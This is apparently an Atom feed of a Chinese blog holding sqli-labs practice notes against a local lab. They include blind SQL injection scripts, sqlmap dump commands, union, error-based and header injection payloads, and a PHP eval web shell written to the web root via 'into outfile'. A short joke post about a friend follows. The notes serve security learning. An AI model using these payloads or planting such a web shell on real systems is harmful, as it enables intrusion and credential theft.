<h3 id="知识点补充">知识点补充：</h3>
<pre><code>%s 在python中用法：
1. %10s代表输出宽度为10个字符，如果输出的字符串不超过10，则在左边补空格；宽度超过10，按原长度输出
2. %-10s表示如果输出的字符串宽度不超过10，则在右边补齐空格；宽度超过10，按原长度输出
3. %.10s表示截取前10个字符，若原长度不够10，则原样输出
4. %s 作为待定字符，在后%（i,j）可进行替换，达到爆破效果
</code></pre>
<h3 id="脚本爆破数据库名称">脚本：爆破数据库名称</h3>
<pre><code class="language-python">import urllib.parse
import http.client

#爆破字典
d = list('abcdefghijklmnopqrstuvwxyz')
name = ''
url = &quot;127.0.0.1&quot;

#不确定字数情况下，可以手注确认或者把爆破字数范围扩大
for i in range(1,20):
	for j in d:
		c = http.client.HTTPConnection(url)

        # 一个大坑：必须是url编码，除了%s外都是%%前缀，否则会报错
		body = &quot;/sqli/Less-5/?id=1%%27%%20and%%20mid(database(),%s,1)=%%27%s%%27--+&quot; % (i,j)
		print(body)
		c.request(&quot;GET&quot;, body) #确定方式
		r = c.getresponse() #提取响应包
		data = r.read()
		c.close()
		#确认正确的一项，拼接
		if data.find(b'You are in') &gt;0: 
			name += j
			print(j)
			break
		else:
			print(&quot;no&quot;)
print(name)
</code></pre>
<h3 id="结果-2">结果</h3>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/1624215382215.png" alt="" loading="lazy"></figure>
<h1 id="less-6sqlmap脚本">less-6（sqlmap+脚本）</h1>
<p>（emmmmm,不得不说第一次使用sqlmap,怀疑自己之前爆破个库名都死去活来，是不是傻= =）</p>
<h3 id="查看库名">查看库名</h3>
<pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-6/?id=1/&quot; --dbs 
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/1624216731977.png" alt="" loading="lazy"></figure>
<h3 id="查看表名">查看表名</h3>
<pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-6/?id=1/&quot; --tables
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/1624216883317.png" alt="" loading="lazy"></figure>
<h3 id="查看列名">查看列名</h3>
<pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-6/?id=1/&quot; -D &quot;security&quot; -T &quot;users&quot; --columns
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/1624217172590.png" alt="" loading="lazy"></figure>
<h3 id="查看用户密码">查看用户密码</h3>
<pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-6/?id=1/&quot; -D &quot;security&quot; -T &quot;users&quot; -C &quot;id&quot;,&quot;password&quot; --dump
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/1624218772000.png" alt="" loading="lazy"></figure>
<h3 id="脚本查询id2的用户密码">脚本：查询id=2的用户密码</h3>
<pre><code class="language-python"># 复制粘贴修改body
import urllib.parse
import http.client

#爆破字典
d = list('abcdefghijklmnopqrstuvwxyz123456789-_')
name = ''
url = &quot;127.0.0.1&quot;

#不确定字数情况下，可以手注确认或者把爆破字数范围扩大
for i in range(1,15):
	for j in d:
		c = http.client.HTTPConnection(url)
		body = &quot;/sqli/Less-6/?id=1%%22%%20and%%20mid((select%%20password%%20from%%20security.users%%20where%%20id=2),%s,1)=%%27%s%%27%%20--+&quot; % (i,j)
		print(body)
		c.request(&quot;GET&quot;, body) #确定方式
		r = c.getresponse() #提取响应包
		data = r.read()
		c.close()
		#确认正确的一项，拼接
		if data.find(b'You are in') &gt;0: 
			name += j
			print(j)
			break
		else:
			print(&quot;no&quot;)
print(name)
</code></pre>
<h3 id="结果-3">结果</h3>
<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/1624223954426.png" alt="" loading="lazy"></figure>
<h1 id="less-7">less-7</h1>
<p>id=1'))--+,布尔盲注，脚本基本一样<br>
练习一下sqlmap</p>
<h3 id="查询开头为a的用户和密码">查询开头为a的用户和密码</h3>
<pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-7/?id=1/&quot; -D &quot;security&quot; -T &quot;users&quot; --sql-query=&quot;select username,password from users where username like 'a%'&quot;;
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/1624275315411.png" alt="" loading="lazy"></figure>
<h1 id="less-8">less-8</h1>
<p>id=1'--+,其他一样</p>
<h1 id="less-9时间盲注">less-9(时间盲注)</h1>
<h3 id="脚本id2的用户名要多运行一两次排除因为网速出现的延迟">脚本：id=2的用户名，要多运行一两次，排除因为网速出现的延迟</h3>
<pre><code class="language-python">import time
import urllib.parse
import http.client

#爆破字典
d = list('abcdefghijklmnopqrstuvwxyz')
name = ''
url = &quot;127.0.0.1&quot;

#不确定字数情况下，可以手注确认或者把爆破字数范围扩大
for i in range(1,15):
    for j in d:
        time1=time.time() #开始时间
        c=http.client.HTTPConnection(url)
        body=&quot;/sqli/Less-9/?id=1%%27%%20and%%20if(mid((select%%20username%%20from%%20security.users%%20where%%20id=2),%s,1)=%%27%s%%27,sleep(1),0)--+&quot;%(i,j)
        print(body)
        c.request(&quot;GET&quot;, body) #确定方式
        r = c.getresponse() #提取响应包
        time2=time.time() #结束时间
        data = r.read()
        c.close()
        #确认正确的一项，拼接
        if time2-time1 &gt;1:
            name += j
            print(j)
            break
		
print(name)
</code></pre>
<h3 id="结果-4">结果</h3>
<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/1624287255225.png" alt="" loading="lazy"></figure>
<h1 id="less-10">less-10</h1>
<p>id=1&quot;--+,其他和9一样</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[sqli-labs学习1~20]]></title>
        <id>https://z0ekball.github.io/post/sql-zhu-ru-ji-chu-zhi-shi/</id>
        <link href="https://z0ekball.github.io/post/sql-zhu-ru-ji-chu-zhi-shi/">
        </link>
        <updated>2021-06-05T12:22:39.000Z</updated>
        <content type="html"><![CDATA[<h5 id="注为方便学习加入两行代码">注：为方便学习,加入两行代码</h5>
<pre><code class="language-sql">echo $sql;
echo &quot;&lt;br&gt;&quot;;
</code></pre>
<h1 id="贯穿始终的步骤">贯穿始终的步骤：</h1>
<pre><code class="language-sql">mysql查询语句
查库：select schema_name from information_schema.schemata;
查表：select table_name from information_schema.tables where table_schema='security';
查列：select column_name from information_schema.columns where table_name='users';
查字段：select username,password from security.users;
</code></pre>
<h1 id="less-1">less-1</h1>
<p>注入漏洞：id=1'--+</p>
<h3 id="知识点补充">知识点补充：</h3>
<pre><code class="language-sql">* order by //判断多少个注入点
* union select  1,2,3  //查看那些数据可以回显(id=-1)
* group_concat() //批量查询
* concat_ws('~',a,b) //查询a~b
</code></pre>
<h3 id="查看当前数据库">查看当前数据库</h3>
<pre><code class="language-sql">id=-1' union select 1,2,database() --+
id=-1'  union select 1,2,concat_ws('~',user(),version(),database()) --+ 
//查询数据库版本,路径,当前用户,当前数据库
</code></pre>
<h3 id="查看数据库所有数据库">查看数据库/所有数据库</h3>
<pre><code class="language-sql">id=-1' union select 1,2,schema_name from information_schema.schemata limit 4,1--+  //limit 决定查看序数
id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+
</code></pre>
<h3 id="查看表所有表">查看表/所有表</h3>
<pre><code class="language-sql">id=-1' union select 1,2,table_name from information_schema.tables where table_schema=0x() limit 1,1--+
//十六进制绕过
id=-1' union select 1,2,group_concat(table_name) from information_schema. tables where table_schema=0x()--+
</code></pre>
<h3 id="查看列信息所有列信息">查看列信息/所有列信息</h3>
<pre><code class="language-sql">id=-1' union select 1,2,column_name from information_schema.columns where table_name=0x() --+

id=-1' union select 1,2,group_concat(column_name) from information_schema. columns where table_name=0x()--+
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/1623248765124.png" alt="" loading="lazy"></figure>
<h3 id="连接查询用户名和密码所有用户和密码">连接查询用户名和密码/所有用户和密码</h3>
<pre><code class="language-sql">id=-1'  union select 1,2,concat_ws('~',username,password)from security.users limit 1,1--+

id=-1' union select 1,2,group_concat(concat_ws('~',username,password))from security.users--+
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/1623248880427.png" alt="" loading="lazy"></figure>
<h1 id="less-2">less-2</h1>
<p>注入漏洞：id=1--+,不需要'</p>
<h1 id="less-3">less-3</h1>
<p>注入漏洞：id=1')--+</p>
<h1 id="less-4">less-4</h1>
<p>注入漏洞：id=1”)--+</p>
<h1 id="less-5布尔型盲注">less-5（布尔型盲注）</h1>
<p>注入漏洞：1'--+,布尔型盲注</p>
<h3 id="知识点补充-2">知识点补充</h3>
<pre><code class="language-sql">1. left(a,b) 从左侧截取a的前b位,正确返回1,错则返回0 ——burpsuit爆破
2. regexp 正则表达式
/转意
^匹配开始部分
$匹配结束部分
.匹配任何字符
[:character_class:]术语类的所有字符匹配的字符类
[[:&lt;:]],[[:&gt;:]]word 边界,
3. like 
'n%'以N开始的
'%g'以g结尾
'%s%'包含s
4.substr(a,b,c) 从b开始,截取a字符c位长度
ascii(substr((select database()),1,1)2分法获得字符 
//当没有在当前数据库下没有回显,一般不适用
</code></pre>
<h3 id="猜测字符方法">猜测字符方法</h3>
<pre><code>burpsuite爆破
手动二分法
脚本
</code></pre>
<h3 id="示例">示例</h3>
<pre><code class="language-sql">burpsuite:  id=1' and left((select database()),1))='a'--+
</code></pre>
<p><img src="https://z0ekball.github.io/post-images/1623250110147.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/1623250114161.png" alt="" loading="lazy"></p>
<h1 id="less-6">less-6</h1>
<p>注入漏洞：id=1”--+,布尔型盲注</p>
<h1 id="less-7一句话木马">less-7（一句话木马）</h1>
<p>注入漏洞：id=1'))--+,布尔型盲注</p>
<h3 id="知识点补充-3">知识点补充：</h3>
<pre><code class="language-sql">1.一句话木马： &lt;?php @eval($_POST['attack']);?&gt;
【基本原理】利用文件上传漏洞,往目标网站中上传一句话木马,然后你就可以在本地通过中国菜刀chopper.exe即可获取和控制整个网站目录。@表示后面即使执行错误,也不报错。eval()函数表示括号内的语句字符串什么的全都当做代码执行。$_POST['attack']表示从页面中获得attack这个参数值。
【条件】
(1)木马上传成功,未被杀;
(2)知道木马的路径在哪;
(3)上传的木马能正常运行。
2.load_file('文件路径')：读取本地文件 (避免特殊字符使用双斜杠\\)
3.into outfile：写文件
</code></pre>
<h3 id="示例-2">示例</h3>
<pre><code class="language-sql">id=1')) union select 1,2,'&lt;?php @eval($_POST[''pass'']);?&gt;' into outfile 'D:\\learning_tools\\phpstudy\\phpstudy_pro\\WWW\\sqli\\Less-7\\test2.php' --+
</code></pre>
<p><img src="https://z0ekball.github.io/post-images/1623251647771.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/1623251657358.png" alt="" loading="lazy"></p>
<h1 id="less-8">less-8</h1>
<p>注入漏洞：id=1'--+,布尔盲注</p>
<h1 id="less-9时间盲注">less-9（时间盲注）</h1>
<p>注入漏洞：id=1' --+,时间盲注</p>
<h3 id="实例">实例</h3>
<pre><code class="language-sql">id=1' and sleep(5)--+ //延迟5秒表示注入成功
</code></pre>
<h1 id="less-10">less-10</h1>
<p>注入漏洞：id=1”--+,时间盲注</p>
<h1 id="less-11">less-11</h1>
<p>注入漏洞：uname=n'or 1=1 #&amp;passwd=admin&amp;submit=Submit</p>
<h3 id="实例-和get相同">实例 (和get相同)</h3>
<pre><code class="language-sql">//查多少个注入点
uname=n' order by 2 #&amp;passwd=admin&amp;submit=Submit

//查到数据库——security
uname=n' union select 1,schema_name from information_schema.schemata limit 2,1 #&amp;passwd=admin&amp;submit=Submit 

//查看表——users
uname=n' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security'  #&amp;passwd=admin&amp;submit=Submit

//查看列——username
uname=n' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'  #&amp;passwd=admin&amp;submit=Submit

//查所有username
uname=n' union select 1,group_concat(username) from security.users  #&amp;passwd=admin&amp;submit=Submit

//查询用户~密码
uname=n' union select 1,group_concat(concat_ws(0x7e,username,password)) from security.users  #&amp;passwd=admin&amp;submit=Submit
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/1623253088112.png" alt="" loading="lazy"></figure>
<h1 id="less-12">less-12</h1>
<p>注入漏洞：uname=n&quot;) or 1=1 #&amp;passwd=admin&amp;submit=Submit</p>
<h1 id="less-13-布尔盲注">less-13 (布尔盲注)</h1>
<p>注入漏洞：uname=n') or 1=1 #&amp;passwd=admin&amp;submit=Submit<br>
布尔型盲注</p>
<h3 id="实例-2">实例</h3>
<pre><code class="language-sql">burp suite爆破：
uname=n') or left(database(),1)='a' #&amp;passwd=admin&amp;submit=Submit
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/1623253489685.png" alt="" loading="lazy"></figure>
<h1 id="less-14">less-14</h1>
<p>注入漏洞：uname=n&quot; or 1=1#&amp;passwd=admin&amp;submit=Submit<br>
布尔型盲注</p>
<h1 id="less-15">less-15</h1>
<p>注入漏洞：uname=addmin&amp;passwd=ad' or 1=1 #&amp;submit=Submit<br>
注入点在passwd,其他一样<br>
布尔型盲注</p>
<h1 id="less-16">less-16</h1>
<p>注入漏洞：uname=addmin&amp;passwd=ad&quot; or 1=1 #&amp;submit=Submit<br>
布尔型盲注</p>
<h1 id="less-17更新漏洞">less-17（更新漏洞）</h1>
<p>注入漏洞：uname=admin &amp;passwd=dadad' # &amp;submit=Submit<br>
更新密码存在注入漏洞</p>
<h3 id="知识点补充-4">知识点补充</h3>
<pre><code>updatexml(XML_document,XPath_string,new_value)
第一个参数：string格式,xml文件对象名称
第二个参数：xpath格式字符串
第三个参数：string格式,替换查找符合条件的数据
作用：改变文档中符合节点条件的节点值
</code></pre>
<h3 id="实例-3">实例</h3>
<pre><code class="language-sql">//返回当前数据库
uname=admin &amp;passwd=dadad' and updatexml(1,concat(0x7e,(database())),1)# &amp;submit=Submit
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/1623254628297.png" alt="" loading="lazy"></figure>
<h1 id="less-18user-agent漏洞">less-18（User-Agent漏洞）</h1>
<p>注入漏洞：<br>
User-Agent:'or updatexml(1,concat('~',(database())),1) or '1'='1<br>
//   '闭合<br>
User-Agent:'or updatexml(1,concat('~',(database())),1), '','')#<br>
//另一种闭合</p>
<h3 id="实例-4">实例</h3>
<pre><code>//查库
User-Agent:' or updatexml(1,concat(0x7e,(database())),1),'','')#
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/1623256440472.png" alt="" loading="lazy"></figure>
<h1 id="less-19referer漏洞">less-19（Referer漏洞）</h1>
<p>注入漏洞：Referer:' or updatexml(1,concat('~',(database())),1) or '1'='1<br>
注入点在referer,其他一样</p>
<h1 id="less-20-cookie漏洞">less-20 (cookie漏洞)</h1>
<p>注入漏洞：cookie中value值'    #注入</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[关于zyy是只猪这件事]]></title>
        <id>https://z0ekball.github.io/post/a-sa-da-d/</id>
        <link href="https://z0ekball.github.io/post/a-sa-da-d/">
        </link>
        <updated>2021-03-08T13:13:45.000Z</updated>
        <content type="html"><![CDATA[<h2 id="众所周知猪的睫毛很长">众所周知，猪的睫毛很长</h2>
<p>zyy也不例外</p>
<h2 id="猪猪不爱干净">猪猪不爱干净</h2>
<p>zyy也是个不爱洗澡的邋遢怪</p>
<h2 id="猪的毛很卷">猪的毛很卷</h2>
<p>zyy头上几撮飞毛正是如此</p>
]]></content>
    </entry>
</feed>